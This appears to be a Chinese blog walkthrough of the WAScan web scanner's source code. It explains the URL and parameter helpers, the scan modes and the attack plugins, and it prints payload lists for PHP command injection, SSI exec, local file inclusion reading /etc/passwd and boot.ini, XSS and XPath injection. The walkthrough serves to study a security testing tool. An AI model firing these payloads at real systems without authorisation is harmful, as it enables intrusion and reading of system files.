CPath("http://www.google.com/1/aaa.html","bbbb.html")# Out[43]: 'http://www.google.com/1/bbbb.html'# In [44]: CPath("http://www.google.com/1/aaa.html","/2/bbbb.html")# Out[44]: 'http://www.google.com/2/bbbb.html'# In [45]: CPath("http://www.google.com/1/aaa.html","2/bbbb.html")# Out[45]: 'http://www.google.com/1/2/bbbb.html'def CPath(url,path): return urljoin(url,path)# 生成随机参数值# 这段代码存在bug# In [49]: AParams("test=chybeta")# ---------------------------------------------------------------------------# TypeError Traceback (most recent call last)# &lt;ipython-input-49-103eb92ad1e0&gt; in &lt;module&gt;()# ----&gt; 1 AParams("test=chybeta")# /media/chybeta/security/tool/scanner/WAScan/lib/utils/check.py in AParams(params)# 21 return "%s=%s"%(params,random_string)# 22 else:# ---&gt; 23 return "%s%s"%(r_string(10)).upper()# 24 return params# 25 # TypeError: not enough arguments for format string# fix bug：# return "%s%s"%(params, random_string)def AParams(params): random_string = "%s"%(r_string(10)).upper() if '=' not in params: return "%s=%s"%(params,random_string) else: # 这里如果 = 已经出现在 params 中了 return "%s%s"%(r_string(10)).upper() return params# CQuery 拼接 url 和 查询参数 ，主要针对 GET请求def CQuery(url,params): # 生成参数值对 params = AParams(params) # http://test.com/? if url.endswith('?'): # 直接加上 参数 return url+params # 如果不是 elif not url.endswith('?'): # http://test.com/a&amp; if url.endswith('&amp;'): # 也可以直接加上参数 return url+params # http://test.com/?a=1 elif '?' in url and '&amp;' not in url: # 需要加上 &amp; 符号 return url+'&amp;'+params else: # 其他情况，干脆直接 加 ? return url+"?"+params else: # 这句话多余？？？？ return url+"?"+ paramsdef CParams(url): if '&amp;' not in url: url = sub(findall(r'\?(\S*)\=',url)[0],'%s%s%s'%(GREEN%(1),findall(r'\?(\S*)\=',url)[0],RESET),url) return url elif '&amp;' in url: url = sub(findall(r'\&amp;(\S*)\=',url)[0],'%s%s%s'%(GREEN%(1),findall(r'\&amp;(\S*)\=',url)[0],RESET),url) return url else: return url# url检查，协议def CUrl(url): split = urlsplit(url) # check URL scheme if split.scheme not in ['http','https','']: # e.g: exit if URL scheme = ftp,ssh,..etc exit(less('Check your URL, scheme "%s" not supported!!'%(split.scheme))) else: # if URL --&gt; www.site.com if split.scheme not in ['http','https']: # return http://www.site.com return "http://%s"%(url) else: return url# url重组def CNQuery(url): if '?' in url: parse = urlsplit(url) if parse.scheme:return parse.scheme + '://' + parse.netloc + '/' else: return 'http://' + parse.path+'/' else: parse = urlsplit(url) if parse.scheme:return parse.scheme + '://' + parse.netloc + '/' else:return 'http://' + parse.path + '/'# 检查url的尾部 是否 / 结尾，去除def CEndUrl(url): if url.endswith('/'): return url[:-1] return url# 接受 scan参数即 扫描类型# 然后进行检查是否在 0 - 5 的范围内def CScan(scan): # check scan options if scan not in ['0','1','2','3','4','5']: info('Option --scan haven\'t argument, assuming default value 5') scan = int('5') if isinstance(scan,str): return int(scan) return int(scan)# 对 URL进行各项切分class SplitURL: def __init__(self,url): # http,https # 协议 self.scheme = urlsplit(url).scheme # 域名 # www.site.com self.netloc = CUrl(urlsplit(url).netloc) # 路径 # /test/index.php self.path = urlsplit(url).path # 查询参数 # id=1&amp;f=1 self.query = urlsplit(url).query # fragment # #test self.fragment = urlsplit(url).fragment# 解析 host头部def CHeaders(headers): # e.g: "Host:google.com" return &#123;'Host':'google.com'&#125; _ = &#123;&#125; if ':' in headers: if ',' in headers: headerList = headers.split(',') for header in headerList: _[header.split(':')[0]] = header.split(':')[1] else: _[headers.split(':')[0]] = headers.split(':')[1] return _# 用于 认证def CAuth(auth): if ':' not in auth: return "%s:"%(auth) return auth 颜色常量定义： lib/utils/colors.py定义一些颜色常量，略过。 列举py文件： lib/utils/dirs.py定义了dirs函数，用于列举出指定目录下，指定后缀名为py，且不是__init__.py的 py文件。1234567def dirs(path): files = [] _ = os.listdir(path) for file in _: if not file.endswith('.py') or file == '__init__.py':pass else:files.append(file) return files 测试用例如下：12345678910111213141516171819In [39]: from lib.utils.dirs import dirsIn [40]: dirs("./")Out[40]: ['wascan.py']In [41]: dirs("./lib/utils/")Out[41]: ['params.py', 'usage.py', 'colors.py', 'readfile.py', 'exception.py', 'check.py', 'printer.py', 'unicode.py', 'settings.py', 'rand.py', 'dirs.py', 'payload.py'] 异常定义：lib/utils/exception.py定义了几种可能出现的错误：1234567891011121314151617181920class WascanUnboundLocalError(UnboundLocalError): passclass WascanDataException(Exception): passclass WascanNoneException(Exception): passclass WascanInputException(Exception): passclass WascanGenericException(Exception): passclass WascanConnectionException(HTTPError): passclass WascanKeyboardInterrupt(KeyboardInterrupt): pass 参数payload处理：lib/utils/params.py定义了两个类，用于处理请求参数和payload的关系,替换和拼接。替换的场景，比如任意文件读取，?readfile=xx 可能替换成?readfile=/etc/passwd 。拼接的场景，比如SQL注入，?id=1 ,可能拼接为 ?id=1&#39; 或者 ?id=1&quot; or 1=1 第一个类preplace替换，用于把请求参数的值替换为对应的payload。存疑一:get请求中用sub(porignal,ppayload,self.url)来处理，而post请求中用self.data.replace(porignal,ppayload请求。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class preplace: """ replace params with payload""" # 初始化 def __init__(self,url,payload,data): # url self.url = url # data 指 POST请求的 POST部分 # 对于 GET 请求，data 为 None self.data = data # _params self._params = [] # 对应的 payload self.payload = payload # 处理GET请求 # http://test.com?a=1&amp;b=2 def get(self): """get""" params = self.url.split("?")[1].split("&amp;") # params = ['a=1', 'b=2'] # 对 params 中的每一个参数 for param in params: # 按照 = 切割，替换成payload 即 a=payload ppayload = param.replace(param.split("=")[1],self.payload) # 获取原本的参数对 porignal = param.replace(ppayload.split("=")[1],param.split("=")[1]) # http://test.com?a=payload&amp;b=2 self._params.append(sub(porignal,ppayload,self.url)) # 处理POST请求 def post(self): """post""" params = self.data.split("&amp;") for param in params: ppayload = param.replace(param.split("=")[1],self.payload) porignal = param.replace(ppayload.split("=")[1],param.split("=")[1]) self._params.append(self.data.replace(porignal,ppayload)) # 开始处理 def run(self): # 如果 url中 带有 ? , 并且 data部分 为 None if "?" in self.url and self.data == None: # GET请求 处理 self.get() # 如果 url中 没有 ? , 并且 data部分 不为 None elif "?" not in self.url and self.data != None: # POST请求 处理 self.post() # 其他情况 无法明确判断 else: # 都进行一遍处理 self.get() self.post() return self._params 第二个类padd，用于往请求参数中添加payload。12345678910111213141516171819202122232425262728293031323334353637class padd: """ add the payload to params """ # 基本的初始化 def __init__(self,url,payload,data): self.url = url self.data = data self._params = [] self.payload = payload # 处理GET请求 # http://test.com?a=1&amp;b=2 def get(self): """get""" params = self.url.split("?")[1].split("&amp;") for param in params: # a=1payload ppayload = param.replace(param.split("=")[1],param.split('=')[1]+self.payload) porignal = param.replace(ppayload.split("=")[1],param.split("=")[1]) self._params.append(sub(porignal,ppayload,self.url)) def post(self): """post""" params = self.data.split("&amp;") for param in params: ppayload = param.replace(param.split("=")[1],param.split('=')[1]+self.payload) porignal = param.replace(ppayload.split("=")[1],param.split("=")[1]) self._params.append(self.data.replace(porignal,ppayload)) # 进行处理 def run(self): if "?" in self.url and self.data == None: self.get() elif "?" not in self.url and self.data != None: self.post() else: self.get() self.post() return self._params 基本攻击payload: lib/utils/payload.py整合了基本攻击的各种payload。对于每种攻击，返回list。结合前面整体功能 -&gt; 攻击章节： 类型 对应函数payload Bash 命令注入 bash() SQL盲注 bsql() 溢出 None CRLF crlfp() 头部SQL注入 None 头部XSS None HTML注入 html() LDAP注入 ldap() 本地文件包含 plfi() 执行操作系统命令 os() php 代码注入 php() SQL注入 sql() 服务器端注入 ssip() , pssi() Xpath注入 xpath() XSS pxss() XML注入 xxep() 头部SQL注入、溢出、头部XSS在该文件中对应的payload似乎没有出现。payload的具体内容就这里不展开，具体等后文与调用代码结合解释。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# Server Side Injection # 有待研究def ssip(): """ Server Side Injection """ 省略# CRLF # CRLF字符对应 %0d %0adef crlfp(): """Carriage Return Line Feed""" 省略# XXEdef xxep(): """ XML External Entity""" 省略# SSIdef pssi(): """ Server Side Include""" 省略# XSSdef pxss(): """ Cross-Site Scripting""" 省略# php代码注入def php(): """ PHP Code Injection """ 省略# xpath注入def xpath(): """ Xpath """ 省略# bash注入def bash(): """Basic Bash Command Injection """ 省略# sql注入def sql(): """Generic SQL""" 省略# os命令注入def os(): """ OS Command Injection """ 省略# 本地文件包含def plfi(): """ Local file Inclusion """ 省略# 盲注def bsql(): """ Blind SQL Injection """ 省略# html注入def html(): """ HTML Code Injection """ 省略# ldap注入def ldap(): """ LDAP Injection """ 省略 格式化打印： lib/utils/printer.py定义了各种打印输出方法，基本的格式化字符串、颜色、编码等等。123456789101112131415161718def plus(string,flag="[+]"): print "&#123;&#125;&#123;&#125;&#123;&#125; &#123;&#125;&#123;&#125;&#123;&#125;".format( GREEN%(0),flag,RESET, WHITE%(0),ucode(string),RESET )def less(string,flag="[-]"):def warn(string,flag="[!]"):def test(string,flag="[*]"):def info(string,flag="[i]"):def more(string,flag="|"):def null(): print "" 随机串生成： lib/utils/rand.py定义两个函数。第一个是r_time基于当前时间strftime(&#39;%y%m%d&#39;) 用来生成随机数字。123def r_time(): """ random numbers """ return randint(0,int(strftime('%y%m%d'))) 第二个是r_string，用于生成指定长度为n的包含大写或者小写字母的随机字符串。123def r_string(n): """ random strings """ return "".join([choice(uppercase+lowercase) for _ in xrange(0,int(n))]) 文件读取操作：lib/utils/readfile.py该文件定义了readfile函数，用于基本的文件读取操作。首先判断路径是否为空，!=None或者!=&quot;&quot;。利用列表生成器，line.strip()在读取每一行后去除两边的空白符。：12345def readfile(path): """ read file """ if path != None or path != "": return [line.strip() for line in open(path,'rb')] return 基本设置：lib/utils/settings.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# tool name 工具名称，即命令行运行时的第一个参数NAME = argv[0]# tool version 版本 VERSION = "v0.2.1"# author 作者 AUTHOR = "Momo Outaadi (M4ll0k)"# description 描述DESCRIPTION = "Web Application Scanner"# name + description + version NVD = (NAME.split('.')[0]).title()+": "+DESCRIPTION+" - "+VERSION# max threads 最大线程数量MAX = 5# args 命令行参数CHAR = "u:s:H:d:m:h:R:a:A:c:p:P:t:n:v=:V=:r=:b=:"# 与上面命令行参数对应的 完整参数名称LIST_NAME = [ 省略]# argvARGV = argv# dict argsARGS = &#123; 'auth': None, 'brute': None, 'agent': ragent(), 'proxy': None, 'pauth': None, 'cookie': None, 'timeout': 5, 'redirect': True, 'headers': &#123;&#125;, 'data': None, 'method': 'GET'&#125;# timeTIME = strftime('%d/%m/%Y at %H:%M:%S')TNOW = strftime('%H:%M:%S')# print versiondef Version(): print "\n&#123;&#125;".format(NVD) print "Author: &#123;&#125;\n".format(AUTHOR) exit()# print time and urldef PTIME(url): plus("URL: &#123;&#125;".format(url)) plus("Starting: &#123;&#125;".format(TIME)) null() 编码： lib/utils/unicode.py统一转换成utf-8来处理1234def ucode(string): if isinstance(string,unicode): return string.encode('utf-8') return string 帮助信息：lib/utils/usage.py用来输出一些帮助信息，全程一行行print，简单粗暴。1234567class usage: """ docstring for usage """ def banner(self): 省略 def basic(self,_exit_=True): 省略 lib/handler 文件夹这里定义了几种扫描处理模式。回到主文件wascan.py中，它真正开始扫描是后半部分代码，根据kwargs[&#39;brute&#39;]或scan的值去选择不同的模式，比如若指定了brute，则会调用BruteParams模式，其余类似。这些模式都整合在handler目录下。 暴破：lib/handler/brute.py第一种暴破指去爆破页面中的隐藏参数。brute.py对应代码如下：123def BruteParams(kwargs,url,data): params(kwargs,url,data).run() exit(0) 其中params类后文再详解。 主文件wascan.py的调用入口：12if kwargs['brute']: BruteParams(kwargs,url,kwargs['data']).run() 第二种爆破指后台爆破、路径爆破。brute.py对应代码如下：1234567891011121314path = os.path.join(os.path.abspath('.').split('lib')[0],'plugins/brute/')def Brute(kwargs,url,data): # 获取 根路径 url = CNQuery(url) info('Starting bruteforce module...') # dirs函数，获取指定path目录下的以py结尾的非 __ini__.py 的py文件 for file in dirs(path): file = file.split('.py')[0] __import__('plugins.brute.%s'%(file)) # 作为模块导入，开始爆破 module = sys.modules['plugins.brute.%s'%(file)] module = module.__dict__[file] module(kwargs,url,data).run() 主文件wascan.py中两处入口：123456if scan == 3: Brute(kwargs,url,kwargs['data'])省略if int(scan) == 5: 省略 Brute(kwargs,parse.netloc,kwargs['data']) 指纹：lib/handler/fingerprint.py指纹识别模式。fingerprint.py代码中Fingerprint类如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class Fingerprint(Request): """Fingerprint""" def __init__(self,kwargs,url): # 相关参数 初始化 Request.__init__(self,kwargs) self.kwarg = kwargs self.url = url def run(self): info('Starting fingerprint target...') try: # -- request -- # 首先发送HTTP GET请求 req = self.Send(url=self.url,method="GET") # -- detect server -- # 探测 服务器指纹 # 一个站点往往对应一种服务器如apache # 根据头部返回的信息 server: xxx 来确定 __server__ = server(self.kwarg,self.url).run() if __server__: # 若探测到，plus打印模式 plus('Server: %s'%(__server__)) # -- detect cms # 探测 cms框架指纹 __cms__ = Cms(req.headers,req.content) # 同一个站点，可能同时使用多种cms。因此会返回多种结果 for cms in __cms__: if cms != (None and ""): plus('CMS: %s'%(cms)) # -- detect framework # 探测 web框架 __framework__ = Framework(req.headers,req.content) for framework in __framework__: if framework != (None and ""): plus('Framework: %s'%(framework)) # -- detect lang # 探测 编程语言 __lang__ = Language(req.content) for lang in __lang__: if lang != (None and ""): plus('Language: %s'%(lang)) # -- detect os # 探测 操作系统版本 __os__ = Os(req.headers) for os in __os__: if os != (None and ""): plus('Operating System: %s'%os) # -- detect waf # 探测 waf种类 __waf__ = Waf(req.headers,req.content) for waf in __waf__: if waf != (None and ""): plus('Web Application Firewall (WAF): %s'%waf) Headers(req.headers,req.content) except Exception as e: pass 在探测server时，由于WAScan直接采用了返回头部中的server字段，没有爆破处理。所以server函数实际存放在plugins/fingerprint/server/server.py。而其他类型的指纹，比如cms、framework、Language、Os、Waf等，难以直接确定，需要多种脚本去尝试，所以这几种类型的指纹探测，都是在fingerprint.py中定义了一个入口函数，用来导入`plugins/fingerprint/目录下的相关探测模块。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556g_path = os.path.join(os.path.abspath('.').split('lib')[0],'plugins/fingerprint/')def Cms(headers,content): cms = [] path = g_path+'cms/' for file in dirs(path): file = file.split('.py')[0] __import__('plugins.fingerprint.cms.%s'%(file)) module = sys.modules['plugins.fingerprint.cms.%s'%(file)] module = module.__dict__[file] cms.append(module(headers,content)) return cmsdef Framework(headers,content): framework = [] path = g_path+'framework/' for file in dirs(path): file = file.split('.py')[0] __import__('plugins.fingerprint.framework.%s'%(file)) module = sys.modules['plugins.fingerprint.framework.%s'%(file)] module = module.__dict__[file] framework.append(module(headers,content)) return frameworkdef Language(content): language = [] path = g_path+'language/' for file in dirs(path): file = file.split('.py')[0] __import__('plugins.fingerprint.language.%s'%(file)) module = sys.modules['plugins.fingerprint.language.%s'%(file)] module = module.__dict__[file] language.append(module(content)) return languagedef Os(headers): operating_system = [] path = g_path+'os/' for file in dirs(path): file = file.split('.py')[0] __import__('plugins.fingerprint.os.%s'%(file)) module = sys.modules['plugins.fingerprint.os.%s'%(file)] module = module.__dict__[file] operating_system.append(module(headers)) return operating_systemdef Waf(headers,content): web_app_firewall = [] path = g_path+'waf/' for file in dirs(path): file = file.split('.py')[0] __import__('plugins.fingerprint.waf.%s'%(file)) module = sys.modules['plugins.fingerprint.waf.%s'%(file)] module = module.__dict__[file] web_app_firewall.append(module(headers,content)) return web_app_firewall 在完成所有类型的探测后，wascan在结尾调用了Headers(req.headers,req.content)，这个根据响应来确定一些信息，具体作用等讲解plugins/fingerprint时再详说。1234def Headers(headers,content): if 'set-cookie' in headers.keys() or 'cookie' in headers.keys(): cookies().__run__(headers['set-cookie'] or headers['cookie']) header().__run__(headers) 在主文件wascan.py中有两处入口，如下：12345if scan == 0: Fingerprint(kwargs,url).run()if int(scan) == 5: 省略 Fingerprint(kwargs,url).run() 攻击：lib/handler/attacks.py导入各种攻击的模块，然后调用运行12345678910path = os.path.join(os.path.abspath('.').split('lib')[0],'plugins/attacks/')def Attacks(kwargs,url,data): info('Starting attacks module...') for file in dirs(path): file = file.split('.py')[0] __import__('plugins.attacks.%s'%(file)) module = sys.modules['plugins.attacks.%s'%(file)] module = module.__dict__[file] module(kwargs,url,data).run() 主文件wascan.py中的入口：12if scan == 1: Attacks(kwargs,url,kwargs['data']) 审计：lib/handler/audit.py载入各种审计的模块，然后调用运行。1234567891011path = os.path.join(os.path.abspath('.').split('lib')[0],'plugins/audit/')def Audit(kwargs,url,data): url = CNQuery(url) info('Starting audit module...') for file in dirs(path): file = file.split('.py')[0] __import__('plugins.audit.%s'%(file)) module = sys.modules['plugins.audit.%s'%(file)] module = module.__dict__[file] module(kwargs,url,data).run() 主文件wascan.py中的入口：12if scan == 2: Audit(kwargs,url,kwargs['data']) 信息搜集：lib/handler/disclosure.py载入各种信息搜集的模块，然后调用运行。1234567891011121314151617path = os.path.join(os.path.abspath('.').split('lib')[0],'plugins/disclosure/')class Disclosure(Request): def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url def run(self): info('Starting disclosure module...') req = self.Send(url=self.url,method='GET') for file in dirs(path): file = file.split('.py')[0] __import__('plugins.disclosure.%s'%(file)) module = sys.modules['plugins.disclosure.%s'%(file)] module = module.__dict__[file] if file == 'errors':module(req.content,req.url) else:module(req.content) 主文件wascan.py中的入口：12if scan == 4: Disclosure(kwargs,url,kwargs['data']).run() 爬虫：lib/handler/crawler.py爬虫调用，在给定一个url后，在fullscan模式下会去爬去页面中所有的链接，然后进行检查。对应代码如下：1234567891011class Crawler: """ cralwer """ def run(self, kwargs, url, data): info("Starting crawler...") links = [] links.append(url) for link in links: for k in SCrawler(kwargs, url, data).run(): if k not in links: links.append(k) return links links保存所有的url，一开始就一个。然后通过调用爬虫：lib/request/crawler.py中的SCrawler爬虫，不断地往links中添加，然后不断爬取。 主文件的入口：123if int(scan) == 5: 省略 for u in Crawler().run(kwargs,url,kwargs['data']): 完整扫描： lib/handler/fullscan.py实际代码如下：12345def FullScan(kwargs,url,data): info('Starting full scan...') if '?' in url: Attacks(kwargs,url,data) Disclosure(kwargs,url,data) 主文件入口：123456789if int(scan) == 5: 省略 for u in Crawler().run(kwargs,url,kwargs['data']): 省略 if type(u[0]) is tuple: 省略 FullScan(kwargs,u[0],kwargs['data']) else: FullScan(kwargs,u,kwargs['data']) 所以综上，fullscan模式的整体流程如下： Fingerprint() Crawler() FullScan() Attacks() Disclosure() Audit() Brute() lib/db 文件夹整合各种字典。先略过。 plugins/attacksplugins/attacks/htmli.py检查HTML代码注入。思路即：在参数值中添加进html代码，然后检查返回的响应，直接用search(payload,req.content) 来看能否检测到相应的模式，。若存在则保存URL、DATA、PAYLOAD,然后输出。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class htmli(Request): """ Html Code Injection """ get = "GET" post = "POST" def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url self.data = data def run(self): """ Run """ info('Checking HTML Injection...') URL = None DATA = None PAYLOAD = None # start for payload in html(): # post method if self.data: # data add payload addPayload = padd(self.url,payload,self.data) for data in addPayload.run(): # send request req = self.Send(url=self.url,method=self.post,data=data) # search payload in response content if search(payload,req.content): URL = req.url DATA = data PAYLOAD = payload break # get method else: # url and payload urls = padd(self.url,payload,None) for url in urls.run(): # send request req = self.Send(url=url,method=self.get) # search payload in response content if search(payload,req.content): URL = url PAYLOAD = payload break # break if URL and PAYLOAD not empt if URL and PAYLOAD: # print if DATA != None: plus("A potential \"HTML Code Injection\" was found at:") more("URL: &#123;&#125;".format(URL)) more("POST DATA: &#123;&#125;".format(DATA)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) elif DATA == None: plus("A potential \"HTML Code Injection\" was found at:") more("URL: &#123;&#125;".format(URL)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) # break break plugins/attacks/phpi.py检查PHP代码注入。采用的是 system(&quot;cat /etc/passwd&quot;)类似的payload来检测在返回的响应中匹配的是 root: /bin/bash字符串，或者通过system(&quot;echo&quot;)输出随机字符串来匹配。个人看法，system在许多情况下都是被禁用的，因此通过system来检测成功率估计不高。另外/etc/passwd只存在UNIX系统上，win需要其他方式来检查。如果用phpinfo()可能会更好。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class phpi(Request): """ PHP Code Injection """ get = "GET" post = "POST" def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url self.data = data def run(self): """ Run """ info('Checking PHP Code Injection...') URL = None DATA = None PAYLOAD = None for payload in php(): # post method if self.data: # data add payload rPayload = preplace(self.url,payload,self.data) for data in rPayload.run(): # split payload if "\"" in payload: payload = payload.split('"')[1] # send request req = self.Send(url=self.url,method=self.post,data=data) # search payload in req.content # payload采用的是 system("cat /etc/passwd") # 因此匹配的是 root: /bin/bash if search(r"root\:\/bin\/bash|"+payload,req.content): URL = req.url DATA = data PAYLOAD = payload break # get method else: # url query add payload urls = preplace(self.url,payload,None) for url in urls.run(): # split payload if "\"" in payload: payload = payload.split('"')[1] # send request req = self.Send(url=url,method=self.get) # search payload in req.content if search(r"root\:\/bin\/bash|"+payload,req.content): URL = url PAYLOAD = payload break # if URL and PAYLOAD not empty if URL and PAYLOAD: # print if DATA != None: plus("A potential \"PHP Code Injection\" was found at:") more("URL: &#123;&#125;".format(URL)) more("POST DATA: &#123;&#125;".format(DATA)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) elif DATA == None: plus("A potential \"PHP Code Injection\" was found at:") more("URL: &#123;&#125;".format(URL)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) # break break 对应的payload 在 lib/utils/payload.py:68 ：1234567# php代码注入def php(): """ PHP Code Injection """ payload = ["system('/bin/echo%20\""+r_string(30)+"\"')"] payload += ["system('/bin/cat%20/etc/passwd')"] payload += ["system('echo\""+r_string(30)+"\"')"] return payload plugins/attacks/ssi.py因为这个情况往往存在UNIX系统中，win一般不存在该漏洞。所以payload中只尝试读取/etc/passwd，然后检测响应。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class ssi(Request): """ Server Side Injection """ get = "GET" post = "POST" def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url self.data = data def run(self): """ Run """ info('Checking Server Side Injection...') URL = None DATA = None PAYLOAD = None # start for payload in ssip(): # post method if self.data: # data add payload addPayload = padd(self.url,payload,self.data) for data in addPayload.run(): # send request req = self.Send(url=self.url,method=self.post,data=data) # search payload in response content if search(r'root:/bin/[bash|sh]',req.content): URL = req.url DATA = data PAYLOAD = payload break # get method else: # url and payload urls = padd(self.url,payload,None) for url in urls.run(): # send request req = self.Send(url=url,method=self.get) # search payload in response content if search(r'root:/bin/[bash|sh]',req.content): URL = url PAYLOAD = payload break # break if URL and PAYLOAD not empty if URL and PAYLOAD: # print if DATA != None: plus("A potential \"Server Side Injection\" was found at:") more("URL: &#123;&#125;".format(URL)) more("POST DATA: &#123;&#125;".format(DATA)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) elif DATA == None: plus("A potential \"Server Side Injection\" was found at:") more("URL: &#123;&#125;".format(URL)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) # break break 对应payload：12345678def ssip(): """ Server Side Injection """ payload = ['&lt;pre&gt;&lt;!--#exec cmd="/etc/passwd" --&gt;&lt;/pre&gt;'] payload += ['&lt;pre&gt;&lt;!--#exec cmd="/bin/cat /etc/passwd" --&gt;&lt;/pre&gt;'] payload += ['&lt;pre&gt;&lt;!--#exec cmd="/bi*/ca? /et*/passw?" --&gt;&lt;/pre&gt;'] payload += ['&lt;!--#exec cmd="/etc/passwd" --&gt;'] payload += ['&lt;!--#exec cmd="/et*/pa??w?" --&gt;'] return payload plugins/attacks/bufferoverflow.py溢出bufferoverflow的payload没有在lib/utils/payload.py中出现，而是直接定义在了这里。几种可能的字符，然后三种可能的长度，发包检测响应。这里的serror需要匹配的模式(lib/db/errors/buffer.json)如下：123456789101112&#123; "info":&#123; "name":"BOF", "regexp":[ "\*\*\* stack smashing detected \*\*\*:", "\&lt;html\&gt;\&lt;head\&gt;\&lt;title\&gt;500 Internal Server Error\&lt;\/title\&gt;", "Internal Server Error\&lt;\/h1\&gt;" ] &#125;&#125; bufferoverflow.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374class bufferoverflow(Request): """ Buffer Overflow """ get = "GET" post = "POST" def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url self.data = data def serror(self,resp): """ Return error """ _ = None realpath = path.join(path.realpath(__file__).split('plugins')[0],'lib/db/errors') abspath = realpath+"/"+"buffer.json" _ = self.search(resp,json.loads(readfile(abspath)[0],encoding="utf-8")) if _ != None: return _ def search(self,resp,content): """ Search error in response """ for error in content['info']['regexp']: if search(error,resp): _ = content['info']['name'] return _ def run(self): """ Run """ info('Checking Buffer OverFlow...') URL = None DATA = None PAYLOAD = None # potential char caused buffer overflow char = ["A","%00","%06x","0x0"] for payload in char: # payload * num for num in [10,100,200]: # post method if self.data: # replace params with payload rPayload = preplace(self.url,(payload*num),self.data) for data in rPayload.run(): # send request req = self.Send(url=self.url,method=self.post,data=data) # search errors error = self.serror(req.content) if error: URL = req.url DATA = self.data PAYLOAD = "&#123;&#125; * &#123;&#125;".format(payload,num) break # get method else: urls = preplace(self.url,(payload*num),None) for url in urls.run(): # send request req = self.Send(url=url,method=self.get) # search errors error = self.serror(req.content) if error: URL = url PAYLOAD = "&#123;&#125; * &#123;&#125;".format(payload,num) break # break if URL and PAYLOAD not empty if URL and PAYLOAD: # print if DATA != None: plus("A potential \"Buffer Overflow\" was found at:") more("URL: &#123;&#125;".format(URL)) more("POST DATA: &#123;&#125;".format(DATA)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) elif DATA == None: plus("A potential \"Buffer Overflow\" was found at:") more("URL: &#123;&#125;".format(URL)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) break plugins/attacks/lfi.py代码结构和 bufferoverflow.py 大致相同。 真正的payload 在 lib/utils/payload.py:137：1234567891011121314151617181920212223def plfi(): """ Local file Inclusion """ payload = ["/etc/passwd%00"] payload += ["/etc/passwd"] payload += ["etc/passwd"] payload += ["%00../../../../../../etc/passwd"] payload += ["%00../etc/passwd%00"] payload += ["/./././././././././././boot.ini"] payload += [r"/..\../..\../..\../..\../..\../..\../boot.ini"] payload += ["..//..//..//..//..//boot.ini"] payload += ["../../boot.ini"] payload += ["/../../../../../../../../../../../boot.ini%00"] payload += ["/../../../../../../../../../../../boot.ini%00.html"] payload += ["C:/boot.ini"] payload += ["/../../../../../../../../../../etc/passwd^^"] payload += [r"/..\../..\../..\../..\../..\../..\../etc/passwd"] payload += [r"..\..\..\..\..\..\..\..\..\..\etc\passwd%"] payload += ["../../../../../../../../../../../../localstart.asp"] payload += ["index.php"] payload += ["../index.php"] payload += ["index.asp"] payload += ["../index.asp"] return payload 用于匹配的模式 lib/db/errors/lfi.json：1234567891011121314151617181920212223&#123; "info":&#123; "name":"LFI", "regexp":[ "root:/bin/bash", "root:/bin/sh", "java.io.FileNotFoundException:", "java.lang.Exception:", "java.lang.IllegalArgumentException:", "java.net.MalformedURLException:", "fread\(\):", "for inclusion \'\(include_path=", "Failed opening required", "\&lt;b\&gt;Warning\&lt;\/b\&gt;: file\(", "\&lt;b\&gt;Warning\&lt;\/b\&gt;: file_get_contents\(", "open_basedir restriction in effect", "Failed opening [\'\S*\'] for inclusion \(", "failed to open stream\:", "root\:\/root\:\/bin\/bash", "default=multi([0])disk([0])rdisk([0])partition([1])\WINDOWS" ] &#125;&#125; plugins/attacks/xss.py代码结构与 htmli.py 类似。 对应payload 在 lib/utils/payload.py:51：12345678910111213141516def pxss(): """ Cross-Site Scripting""" payload = [r"&lt;script&gt;alert('"+r_string(5)+"')&lt;/script&gt;"] payload += [r"&lt;script&gt;alert('"+r_string(5)+r"');&lt;/script&gt;"] payload += [r"\'\';!--\"&lt;"+r_string(5)+r"&gt;=&amp;&#123;()&#125;"] payload += [r"&lt;script&gt;a=/"+r_string(5)+r"/"] payload += [r"&lt;body onload=alert('"+r_string(5)+r"')&gt;"] payload += [r"&lt;iframe src=javascript:alert('"+r_string(5)+r"')&gt;"] payload += [r"&lt;x onxxx=alert('"+r_string(5)+r"') 1='"] payload += [r"&lt;/script&gt;&lt;svg onload=alert("+r_string(5)+r")&gt;"] payload += [r"&lt;svg onload=alert('"+r_string(5)+r"')&gt;"] payload += [r"alert\`"+r_string(5)+r"\`"] payload += [r"&gt;&lt;script&gt;"+r_string(5)+""] payload += [r"\"&gt;&lt;script&gt;alert('"+r_string(5)+"');&lt;/script&gt;"] payload += [r"&lt; script &gt; "+r_string(5)+" &lt; / script&gt;"] return payload plugins/attacks/xpathi.py代码结构与 bufferoverflow.py 类似。 payload 在 lib/utils/payload.py:75：1234567891011121314def xpath(): """ Xpath """ payload = ["\'"] payload += ["//*"] payload += ["@*"] payload += ["\' OR \'=\'"] payload += ["\' OR \'1\'=\'1\'"] payload += ["x\' or 1=1 or \'x\'=\'y"] payload += ["%s\' or 1=1 or \'%s\'=\'%s"%(r_string(10),r_string(10),r_string(10))] payload += ["x' or name()='username' or 'x'='y"] payload += ["%s\' or name()='username' or '%s'='%s"%(r_string(10),r_string(10),r_string(10))] payload += ["\' and count(/*)=1 and \'1\'=\'1"] payload += ["\' and count(/@*)=1 and \'1\'=\'1"] return payload 用于匹配的模式在 